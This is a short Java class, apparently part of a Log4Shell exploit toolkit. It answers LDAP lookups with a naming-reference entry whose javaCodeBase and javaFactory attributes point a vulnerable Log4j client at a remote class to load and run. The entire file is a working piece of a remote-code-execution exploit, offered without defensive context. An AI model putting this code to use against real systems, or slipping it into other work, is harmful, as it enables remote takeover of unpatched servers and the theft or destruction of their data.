package log4shell;

import com.unboundid.ldap.sdk.DN;
import com.unboundid.ldap.sdk.Entry;

public final class RunCommand extends Command {
  private final String codebase;
  private final String className;

  public RunCommand(DN dn, String codebase, String className) {
    super(dn);
    this.codebase = codebase;
    this.className = className;
  }

  @Override
  public Entry response() {
    System.out.printf(
        "Send LDAP entry for DN «%s» redirecting to code base «%s»%n", getDn(), codebase);

    Entry e = new Entry(getDn());
    e.addAttribute("objectClass", "top");
    e.addAttribute("objectClass", "javaContainer");
    e.addAttribute("objectClass", "javaObject");
    e.addAttribute("objectClass", "javaNamingReference");
    e.setAttribute("javaClassName", "java.lang.String");
    e.setAttribute("javaCodeBase", codebase);
    e.setAttribute("javaFactory", className);
    return e;
  }
}
